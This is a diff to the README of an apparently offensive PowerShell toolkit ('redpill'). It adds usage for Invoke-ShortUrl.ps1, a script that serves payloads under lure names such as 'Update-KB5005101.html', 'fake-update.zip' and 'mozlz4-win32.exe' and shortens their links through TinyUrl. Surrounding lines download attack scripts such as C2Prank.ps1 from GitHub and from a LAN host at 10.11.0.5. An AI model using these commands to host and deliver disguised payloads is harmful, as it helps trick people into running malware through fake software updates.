@@ -50,3 +50,33 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-S
 cscript wget.vbs http://10.11.0.5/C2Prank.ps1 C2Prank.ps1
 .\wget.vbs https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/C2Prank.ps1 C2Prank.ps1
 ```  
+
+<br />
+
+## Module Name
+   <b><i>Invoke-ShortUrl.ps1 - UNDER-DEVELOP (NOT STABLE)</i></b>
+   
+|Cmdlet Name|Description|Privileges|Notes|
+|---|---|---|---|
+|Invoke-ShortUrl|TinyUrl url generator|User Land|Dependencies: python3 (http.server)|
+
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/Invoke-ShortUrl.ps1" -OutFile "Invoke-ShortUrl.ps1"
+```
+
+```powershell
+#URI: http://127.0.0.1:8080/Update-KB5005101.html
+.\Invoke-ShortUrl.ps1 -ServerPort '127.0.0.1:8080'
+
+#URI: http://192.168.1.72:8087/update.html
+.\Invoke-ShortUrl.ps1 -ServerPort '192.168.1.72:8087' -PayloadName 'update.html'
+
+#URI: http://192.168.1.72:8087/fake-update.zip ( verbose outputs )
+.\Invoke-ShortUrl.ps1 -PayloadName 'fake-update.zip' -Verb 'true'
+
+#URI: http://127.0.0.1:8081/Update-KB5005101.html ( start http.server )
+.\Invoke-ShortUrl.ps1 -serverport '127.0.0.1:8081' -startserver 'true'
+
+#URI: http://192.168.1.72:8087/mozlz4-win32.exe ( start http.server )
+.\Invoke-ShortUrl.ps1 -Payloadname 'mozlz4-win32.exe' -startserver 'true'
+```  
